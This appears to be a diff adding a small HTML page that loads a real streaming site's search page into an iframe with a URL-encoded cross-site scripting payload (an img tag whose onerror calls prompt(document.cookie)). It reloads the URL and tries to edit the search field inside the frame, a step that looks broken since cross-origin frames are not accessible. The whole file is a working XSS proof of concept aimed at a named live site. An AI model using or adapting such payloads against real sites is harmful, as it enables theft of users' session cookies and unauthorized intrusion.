@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Iframe Automation</title>
+</head>
+<body>
+
+<script>
+const iframe = document.createElement('iframe');
+iframe.src = 'https://www.teleboy.ch/en/search?query=name:%3Cimg%20Src%3DOnXSS%20OnError%3Dprompt(document.cookie)%3E555'; // Replace with your URL
+document.body.appendChild(iframe);
+
+iframe.onload = () => {
+  iframe.src = 'https://www.teleboy.ch/en/search?query=name:%3Cimg%20Src%3DOnXSS%20OnError%3Dprompt(document.cookie)%3E555'; // Load the URL a second time
+
+  iframe.onload = () => {
+    const searchBar = iframe.contentDocument.querySelector('input[type="text"]'); // Adjust the selector if needed
+    searchBar.value = searchBar.value.replace('555', '');
+  };
+};
+</script>
+
+</body>
+</html>
